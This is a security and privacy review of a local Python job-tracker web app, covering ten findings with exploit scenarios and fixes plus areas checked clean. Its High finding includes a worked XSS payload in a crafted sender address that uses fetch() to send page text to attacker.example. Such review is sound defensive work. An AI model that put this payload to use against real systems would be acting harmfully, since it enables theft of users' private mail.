# Security and privacy review: Job Tracker local edition (Python)

Repo: /Users/thorn.leung/job-tracker, branch easy-connect (full-codebase review, read-only).
Scope: jobtracker/*.py, jobtracker/jobs/*.py, jobtracker/providers/*.py, jobtracker/templates/*.html, scripts/*, requirements.txt, pytest.ini, .gitignore, SETUP.md.

Method note: the sandbox has no Jinja2/FastAPI installed, so SEC-PY-1 was verified by reading the code paths and applying Jinja's documented autoescape behaviour (`'` becomes `&#39;`), not by running the app. No findings were produced by running a scanner.

Counts: Blocking 0, High 1, Medium 2, Low 7.

---

## High

### SEC-PY-1: JavaScript-string injection (stored XSS) from an email's sender address in the reply confirm dialog
- File: `/Users/thorn.leung/job-tracker/jobtracker/templates/_reply.html:7` (also fed by `web.py:181`, `links.py:24`; rendered from `detail.html:93`, `review.html:30`, `_panel.html:56`)
- Severity: High
- Confidence: 0.85
- Evidence:
  ```html
  <form method="post" action="/email/{{ r_id }}/reply" ...
        onsubmit="return confirm('Send this reply to {{ r_to }}?')">
  ```
  `r_to` is `e.sender|sender_addr`, i.e. `mailtext.split_sender(sender)[1]` (`web.py:181`), where `sender` is stored as `f"{msg.sender_name} <{msg.sender_email}>"` (`sync.py:100`) straight from the incoming mail's From header. The form is only rendered when `r_can and rp`; `rp = reply_link(...)` only requires `_ADDRESS.fullmatch(to)` with
  ```python
  _ADDRESS = re.compile(r"[^@\s<>]+@[^@\s<>]+\.[^@\s<>]+")   # links.py:24
  ```
  This regex allows `'`, `(`, `)`, `"`, `+`, `-`, backtick, `;` and `\` in the address. Jinja autoescape turns `'` into `&#39;`, but the browser HTML-decodes the attribute value before the JavaScript engine parses it, so the `'` terminates the JS string.
- Exploit scenario: a sender whose From address is a quoted local part such as `"x'-fetch(`//attacker.example/?`+document.body.innerText)-'"@attacker.example` (allowed by `_ADDRESS`; no whitespace is needed) sends a "Thank you for applying" style message that the classifier files as related. The attacker controls their own mail server, so the From header is arbitrary. The user has turned on replying for the account (needed for the form to render) and presses Send reply. The `onsubmit` handler runs script in the origin `http://127.0.0.1:8765`. That origin passes the host guard and the same-origin POST check, so the script can: read every stored email, note and resume text through the app's own pages and exfiltrate them (there is no CSP, see SEC-PY-3); POST `/email/{id}/reply` to send mail as the user (to stored senders); delete applications or a whole profile (`confirm=yes`); replace the Google client file (SEC-PY-6). Needs: opt-in replying plus one click on Send reply, so High rather than Blocking.
- Fix: never put untrusted text inside an inline JS string. Options, best first:
  1. Remove the inline handler. Render `<form data-confirm="Send this reply to ...">` (autoescaped attribute text) and have one delegated `submit` listener in `base.html` read `form.dataset.confirm`.
  2. If an inline handler must stay, use `onsubmit="return confirm({{ ('Send this reply to ' ~ r_to ~ '?')|tojson|forceescape }})"`.
  3. Tighten `_ADDRESS` (and the recipient check in `reply.recipient`) to a conservative `[A-Za-z0-9._%+'-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}` with no quotes, parentheses or backticks.
  Also add a CSP (SEC-PY-3) so a future injection cannot exfiltrate.

---

## Medium

### SEC-PY-2: The local server has no authentication; any local process or other user on the machine can read the mailbox data and send replies
- File: `/Users/thorn.leung/job-tracker/jobtracker/web.py:183-203` (guard), `/Users/thorn.leung/job-tracker/jobtracker/cli.py:98` (fixed port 8765)
- Severity: Medium
- Confidence: 0.5
- Evidence: the only gate is
  ```python
  if request.url.hostname not in LOCAL_HOSTS: return 403
  ... origin / sec-fetch-site checks on POST only
  ```
  Requests with no `Origin` and no `Sec-Fetch-Site` headers (curl, any local program, a browser extension, a second Windows user on a shared or terminal-server machine) pass every check. The port is fixed and documented.
- Exploit scenario: another Windows account or a malicious local process opens `http://127.0.0.1:8765/app/N` and reads stored email bodies, sender addresses and resume text, or POSTs `/email/{id}/reply` for an account that has replying turned on. Browser-originated cross-site and DNS-rebinding attacks are correctly blocked (see "Checked and clean"); this finding is about non-browser local callers.
- Fix: generate a random per-launch token (or per-install secret stored with DPAPI), require it in an `HttpOnly; SameSite=Strict` cookie that is set by a one-time `/?k=...` link printed or opened at startup, and reject requests without it. Document in SETUP.md that the dashboard assumes a single-user machine if this is not done.

### SEC-PY-3: No Content-Security-Policy and no framing protection; the port is predictable
- File: `/Users/thorn.leung/job-tracker/jobtracker/web.py` (no response headers are set anywhere; `grep` finds no `X-Frame-Options`, `frame-ancestors` or `Content-Security-Policy`)
- Severity: Medium
- Confidence: 0.55
- Evidence: the app mounts one middleware (`local_only`) that adds only a profile cookie. Pages use many inline `<script>` blocks, so a CSP would need nonces or hashes.
- Exploit scenario: (a) Clickjacking: a malicious page frames `http://127.0.0.1:8765/app/N` (port is fixed and public in SETUP.md) and overlays decoy buttons. Clicks inside the frame produce same-origin POSTs, which pass the `Sec-Fetch-Site` check, so one-click actions such as Delete application, Not an application, Disconnect, or Allow replying (starts the OAuth window) can be triggered. (b) Without a CSP any injection (SEC-PY-1) can send data to any host.
- Fix: add an `http` middleware response header set: `X-Frame-Options: DENY`, `Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-...'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'self'`, plus `Referrer-Policy: no-referrer` and `X-Content-Type-Options: nosniff`. Move inline handlers to the nonce'd scripts.

---

## Low

### SEC-PY-4: Same inline-JS pattern with contact names (cannot execute code today, but breaks the confirm and is one regex change from exploitable)
- File: `/Users/thorn.leung/job-tracker/jobtracker/templates/_person.html:27`
- Severity: Low
- Confidence: 0.6
- Evidence: `onsubmit="return confirm('Remove {{ c.name }} from this application?')"`. `c.name` comes from `contacts.looks_like_a_person` / `_MENTION`, whose token regex `[A-Z][A-Za-z'’-]+` permits `'` and `-` but not parentheses, dots, `=` or backticks, so a string break cannot call a function. The user's own edited name (`contacts.save_edit`, up to 80 chars) is also interpolated, but only the user supplies it.
- Impact: a name such as `O'Neil` produces a syntax error in the attribute, so the handler never runs and the form submits without the confirmation. If the name pattern is ever loosened it becomes SEC-PY-1.
- Fix: same as SEC-PY-1 (data attribute plus delegated handler, or `tojson`).

### SEC-PY-5: Outlook replies are sent to the message's Reply-To, not necessarily the address shown in the confirmation
- File: `/Users/thorn.leung/job-tracker/jobtracker/providers/outlook.py:61-76` (`send_reply` ignores `to`); UI text in `_reply.html:8,13` ("Only {{ r_to }} receives it")
- Severity: Low
- Confidence: 0.4
- Evidence: `requests.post(f"{GRAPH}/me/messages/{id}/reply", json={"comment": body})`. Graph's reply action addresses the reply the way Outlook's Reply does, which honours the original message's Reply-To. The Gmail path sets `To` explicitly from the From address, so the two providers differ, and the `reply.py` docstring ("the recipient is the sender ... taken from the stored email") is not true for Outlook.
- Exploit scenario: a sender (or a phisher spoofing a recruiter) sets `Reply-To: other@evil.example`; the dialog says it will go to the From address, but the user's reply (which may contain CV details or availability) goes to the Reply-To address.
- Fix: send via `/me/sendMail` or create a reply draft (`/createReply`), set `toRecipients` to the displayed `to` explicitly, clear `replyTo`, then send.

### SEC-PY-6: Uploaded Google client file is stored verbatim, including attacker-chosen `auth_uri` and `token_uri`
- File: `/Users/thorn.leung/job-tracker/jobtracker/providers/clients.py:50-58`
- Severity: Low
- Confidence: 0.4
- Evidence: `block = info.get("installed")` is validated only for `client_id` and `client_secret`, then `json.dumps({"installed": block})` is written and later given to `InstalledAppFlow.from_client_secrets_file`.
- Exploit scenario: a user is handed a "credentials file" (tutorial, forum, colleague) whose `token_uri` points to an attacker server; at Connect Gmail the authorization code and the client secret go to the attacker, who can exchange the code at Google for mailbox tokens. Also usable as a persistence step after SEC-PY-1 (same-origin POST of a crafted file).
- Fix: require `auth_uri == "https://accounts.google.com/o/oauth2/auth"` and `token_uri == "https://oauth2.googleapis.com/token"` (or check the host is `accounts.google.com` / `oauth2.googleapis.com`) and drop other keys.

### SEC-PY-7: The export script writes all stored emails to a plaintext file in the working directory, and the file name is not git-ignored
- File: `/Users/thorn.leung/job-tracker/scripts/export_json.py:62,67` and `/Users/thorn.leung/job-tracker/.gitignore`
- Severity: Low
- Confidence: 0.5
- Evidence: default target `Path("jobtracker-export.json")` (relative to where the command runs; SETUP.md runs commands from the repo root). It contains `emails` (sender, subject, body), `ignored_mail`, `activity`. `.gitignore` covers `*.db`, `*.token`, `token*.json`, `client_secret*.json`, `data/`, `secrets/`, but not `jobtracker-export.json` or `*export*.json`. `git status` is clean today and no such file is tracked.
- Impact: one `git add .` from the repo root commits the user's mailbox excerpts and contact details to a repo that has a GitHub Pages workflow and a remote.
- Fix: add `jobtracker-export*.json` to `.gitignore`, and default the output into `data/` (already ignored).

### SEC-PY-8: Mail content, resume text and OAuth client secret are stored unencrypted with default file permissions
- File: `/Users/thorn.leung/job-tracker/jobtracker/db.py:8-13` (SQLite under `data/`), `jobtracker/providers/clients.py:58,66` (`secrets/*_client.json`), `jobtracker/settings.py` (resume text in the `settings` table)
- Severity: Low (privacy)
- Confidence: 0.45
- Evidence: tokens use DPAPI (`providers/base.py:51`, good), but job-related emails (sender, subject, first 4 KB of body), `sent_replies.body`, `ignored_mail` and the full resume text are plaintext in `tracker.db`; `ignored_mail` keeps bodies for 30 days. `Path.write_text` and `mkdir` use inherited ACLs. SETUP.md discloses the locations but states the data is "kept"; it does not mention that the DB is unencrypted.
- Impact: any process or user that can read the project folder (backup tools, sync clients such as OneDrive if the repo lives in a synced folder, another local user) gets the mail excerpts and resume. A deleted/dismissed email's `feedback.subject` and sender also remain after "erase".
- Fix: document it plainly; optionally keep the DB under `%LOCALAPPDATA%` (not a synced folder), restrict the ACL of `data/` and `secrets/` to the current user (`icacls`), and consider DPAPI-wrapping the OAuth client secret as is done for tokens.

### SEC-PY-9: A spoofed "Indeed" alert email can plant an arbitrary http(s) link under "Open posting"
- File: `/Users/thorn.leung/job-tracker/jobtracker/jobs/alerts.py:99` (host taken from the email), gate at `alerts.py:31-39`
- Severity: Low
- Confidence: 0.4
- Evidence: `url = f"{parsed.scheme or 'https'}://{parsed.netloc}/viewjob?jk={jk}"` uses the scheme and host from the `href` in the email HTML. `alert_site` trusts `msg.sender_domain`, which is the unauthenticated From header. `safe_url` (`jobs_web.py:30`) blocks non-http(s) schemes at render, so there is no script execution; the stored URL is also copied into an application note by `store.mark_applied`.
- Exploit scenario: a phishing email with From `alerts@indeed.com`, subject "new jobs", and links `https://evil.example/viewjob?jk=abcdef12` appears in the Jobs tab as a plausible posting; the user clicks "Open posting" (opens in a new tab with `rel=noopener noreferrer`). Requires the mail to pass Gmail/Outlook spam filtering.
- Fix: for Indeed, force the host to an allow-list (`www.indeed.com`, `ca.indeed.com`, ...) and the scheme to `https`, as the LinkedIn branch already does by building a fixed URL.

### SEC-PY-10: Text and profile changes can be triggered by cross-site GET links; unpinned dependencies
- File: `/Users/thorn.leung/job-tracker/jobtracker/web.py:197-202` and `web.py:351-356,446-450` (query-param notices); `/Users/thorn.leung/job-tracker/requirements.txt`
- Severity: Low
- Confidence: 0.35
- Evidence: (a) `GET /?profile=<id>` sets the `jt_profile` cookie, so a cross-site link or image can switch which profile the next page and next form post act on (the cookie is `HttpOnly; SameSite=Lax`, which still allows top-level navigations). (b) `?notice=` / `?error=` are rendered (autoescaped) in a banner, so a crafted link shows attacker-chosen text in a trusted-looking banner. Both need a guessable port and a user click. (c) `requirements.txt` lists unpinned, un-hashed packages (including `msal-extensions`, which protects the tokens), so a fresh install resolves whatever is current on PyPI.
- Fix: only honour `?profile=` on a route that is meant for toast links and require the POST switch otherwise; ignore `notice`/`error` params unless they came from a redirect (use a short-lived flash cookie); pin versions with a lock file and `--require-hashes`.

---

## Checked and clean

- SSRF in `joblink.py` (paste-a-link): scheme limited to http/https; userinfo, control characters, backslash, quotes rejected up front (`_BAD_URL_CHARS`); ports limited to 80/443; host normalised through IDNA before any check (so fullwidth dots and digits cannot hide an IP); numeric hosts in decimal/hex/octal/short form refused; single-label, `.local`, `.internal`, `.lan`, `.home`, `.corp` hosts refused; IPv6 literals handled including IPv4-mapped, 6to4, Teredo, NAT64, zone ids; every resolved address must be globally routable (`_is_global`, a name with even one private answer is refused); the socket connects only to the vetted IP (`_pinned`) with Host/SNI/cert verification on the name, which closes DNS-rebinding between check and use; redirects are followed manually (max 4) and each hop re-runs `parse_url` and the address check; 1 MB and 8 s total caps; content-type allow-list; no proxy use (stdlib `http.client`, not `requests`); the Ashby POST is host- and path-fixed and never redirected; errors returned to the browser are fixed strings (no response bodies or exception text). I found no bypass.
- Job feeds (`jobs/feeds.py`, `jobs/adzuna.py`): requests go to fixed vendor hosts; the user-supplied part is only a path token. An unvalidated token can only alter the path under the vendor host, not the host. Adzuna country is validated against `settings.COUNTRIES`; API key is sent over HTTPS and stored with DPAPI; error messages shown to the user are fixed strings (the key in the URL is not echoed).
- CSRF and DNS rebinding on the local server: `Host` must be 127.0.0.1/localhost/::1 for every request (including static); every POST must have a same-origin `Origin` (host and port compared) and `Sec-Fetch-Site` of same-origin/none; no CORS headers; JSON endpoints are POST or non-sensitive GET and cannot be read cross-origin. State-changing endpoints are all POST (only `GET /?profile=` sets a cookie, SEC-PY-10).
- XSS in templates: Jinja autoescape is on; no `|safe` or `Markup` on user data except `mailtext.render`, which escapes every fragment (links shown as domains, never clickable, tooltip uses `escape`); `|tojson` used for the two JSON script blocks (HTML-safe); inline script blocks contain no Jinja interpolation; `innerHTML` use is on server-rendered fragments or fixed stage names; the "Fill in" script writes with `.value`/`textContent`. Links from stored data go through `joblink.stored_url`, `jobs_web.safe_url` or `links.mailbox_link` (https only) and open with `rel="noopener noreferrer"`. The only JS-string sink found is SEC-PY-1 (and SEC-PY-4).
- SQL injection: all user values are bound parameters; the f-string SQL fragments (`web.py:116,236,861`, `db.py:296`, `jobs/store.py:100`, `jobs/notify.py:51`) use only code-defined column names, whitelisted sort keys or `?` placeholders. `scripts/export_json.py` table names come from a constant list.
- Path traversal and uploads: `/settings/credentials/gmail` reads at most 64 KB into memory, parses JSON, writes to a fixed filename; no client-supplied filename is used for paths. Resume upload uses the filename only for an extension check, reads at most 5 MB + 1, parses in memory. Profile ids are server-made slugs, validated against the registry before any path or `rmtree` use. Gmail token file name derives from the Google-verified address.
- Command injection and unsafe deserialisation: no `subprocess`, `os.system`, `eval`, `exec`, `pickle`, `marshal`; YAML is read with `yaml.safe_load` only; `install-task.ps1` interpolates only `$PSScriptRoot` and fixed strings.
- Redirect targets: `back_to` (Jobs) and `contact_return` / `switch_profile` only allow in-app relative paths (`//` and backslash refused); redirect query strings are `quote`d.
- Reply sending: send permission is requested separately and only when replying is turned on; recipient is taken from the stored sender (not the form) and must match `_ADDRESS` (no whitespace, so no header injection; `EmailMessage` also rejects newlines, and subject whitespace is collapsed); Reply-To is ignored on Gmail; body capped at 5000 chars, hourly/daily caps, one-time token against double send; reply recorded only after provider success. Display names containing `<` make `split_sender` fail closed rather than misaddress.
- Token storage: Gmail and Outlook tokens and Adzuna keys use `FilePersistenceWithDataProtection` (Windows DPAPI); disconnect clears them; Gmail read scope is `gmail.readonly`, Outlook `Mail.Read`; send scopes only on opt-in. MSAL uses PKCE for the interactive flow.
- Secrets in git: `git ls-files` contains no `secrets/`, `data/`, `*.db`, token or client-secret file; no `GOCSPX`, `AIza`, private-key or refresh-token strings in the last 40 commits (only code that reads those field names); `web/site-config.json` holds empty client ids (hosted edition, reviewed elsewhere); `data/` and `secrets/` are git-ignored and the working-tree `data/demo.db` is not tracked.
- Logging and PII: the only log calls record message ids and exception text (`gmail.py:41,150`, `outlook.py:115`, `reply.py:94`); no mail bodies, addresses or tokens are logged. Toast text contains only job titles, company and the profile name.
- Server binding: `cli.py` binds uvicorn to 127.0.0.1 only; OpenAPI/docs endpoints are disabled; the OAuth loopback server is the stock library one.
- Not reviewed in depth: regex-based classifier/extractor performance (DoS is out of scope), the test suite, `scripts/export_fixtures.py` beyond a skim (offline fixture generation, no network or secrets), and the hosted TypeScript edition.
